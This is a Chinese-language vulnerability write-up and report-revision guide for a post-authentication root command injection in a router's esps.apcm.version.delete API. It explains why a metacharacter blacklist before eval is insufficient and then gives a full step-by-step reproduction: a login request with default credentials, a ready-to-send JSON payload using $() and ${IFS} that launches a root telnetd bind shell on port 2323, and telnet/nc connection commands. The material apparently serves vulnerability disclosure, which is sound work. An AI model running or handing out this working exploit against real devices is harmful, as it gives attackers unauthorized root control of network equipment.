# `esps.apcm.version.delete` Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_esps_apcm_version_delete_rce_report.md`

重点是把“为什么 blacklist 不够、PoC 为什么能过”的逻辑补清楚。

## 2. 一句话结论

这条漏洞的本质是：

```text
/api/esps
  -> magic_link 直接转发到 esps.apcm.version.delete
  -> list[] 中的 version 仅做了不完整黑名单过滤
  -> 过滤后仍进入 eval version${idx}="${version}"
  -> $() / ${IFS} / && 仍可执行命令
```

## 3. 关键静态证据

### 3.1 通用 `/api/esps` 转发链

与其他 post-auth `/api/esps` 漏洞相同，可引用：

- `/www/api` `FCGI_EspsProcess`
- `/usr/lib/lua/protol_cvt.lua`
- `/usr/lib/lua/magic_link/magic_link.lua`

### 3.2 删除分支中的 blacklist 与 eval

`/usr/libexec/rpcd/esps.apcm.version`：

- `154-156`：进入 `delete)` 分支
- `165-167`：

```sh
json_get_var version ${idx}
echo "${version}" | grep "[\`\\\"\'\;,]" >/dev/null
```

- `172`：

```sh
eval version"${idx}"="${version}"
```

被过滤的字符只有：

- 反引号
- 双引号
- 单引号
- 分号
- 逗号

但并没有过滤：

- `$`
- `(`
- `)`
- `{`
- `}`
- `&&`

所以 `$()` 与 `${IFS}` 仍然可用。

## 4. 正式稿建议补强点

### 4.1 把 blacklist 的缺口说具体

不要只写“incomplete filtering”，建议明确列出：

- blocked: `` ` " ' ; , ``
- not blocked: `$ ( ) { } &&`

这样更有说服力。

### 4.2 写清 payload 为什么使用 `${IFS}`

PoC 中使用 `${IFS}` 的原因是：

- 避免显式空格
- 兼容 shell 解析
- 在 blacklist 不拦截 `$` 与 `{}` 的情况下仍可构造完整命令

## 5. 建议补充的验证内容

1. 登录拿 session；
2. 调用 `esps.apcm.version.delete`，`list` 中放入恶意 version；
3. 连接临时 `telnetd`；
4. 再调用 `getlist` 可作为状态回读。

## 6. 建议结论写法

> The blacklist in `esps.apcm.version.delete` blocks only a small set of metacharacters before copying the version string through `eval`, leaving command substitution syntax such as `$()` fully exploitable.

## 7. BurpSuite 逐步复现

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`
- 临时 shell 端口：`2323`

### 7.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应里取：

- `data.session`

后续所有 `/api/esps` 包都写：

- `AUTHENTICATION: <SESSION>`

### 7.2 包 2：触发 `esps.apcm.version.delete`

这里用 `${IFS}` 代替空格，原因前面已经分析过。

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.apcm.version","method":"delete","param":{"list":["$(echo${IFS}APCMVER_RCE_OK>/tmp/apcmver_rce_marker&&/usr/sbin/telnetd${IFS}-p${IFS}2323${IFS}-l${IFS}/bin/sh)"]}}]
```

### 7.3 第 3 步：连接 shell 验证 root

```bash
telnet 192.168.8.1 2323
```

或：

```bash
nc 192.168.8.1 2323
```

执行：

```sh
id
uname -a
cat /tmp/apcmver_rce_marker
```

预期：

```text
uid=0(root)
APCMVER_RCE_OK
```

### 7.4 包 3：可选，读取 AP 版本列表

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.apcm.version","method":"getlist","param":{}}]
```

### 7.5 清理 shell

在 shell 里执行：

```sh
ps w | grep 'telnetd -p 2323'
kill <PID>
```
